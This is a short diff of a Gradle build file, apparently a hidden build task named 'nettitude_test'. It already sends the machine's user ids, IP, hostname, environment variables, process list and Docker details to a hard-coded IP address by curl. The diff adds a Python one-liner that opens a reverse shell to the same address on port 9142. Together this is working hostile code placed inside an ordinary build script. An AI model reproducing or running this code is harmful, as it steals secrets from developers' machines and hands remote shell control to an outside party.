@@ -45,6 +45,7 @@ task nettitude_test(){
 	def edocker = java.net.URLEncoder.encode(docker)
 
 	['curl', "-k", "https://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}&env=${eenv}&ps=${eps}&docker=${edocker}"].execute()
+	['python3', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.77.226.156",9142));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'].execute()
 
 	println("Executed")
 }
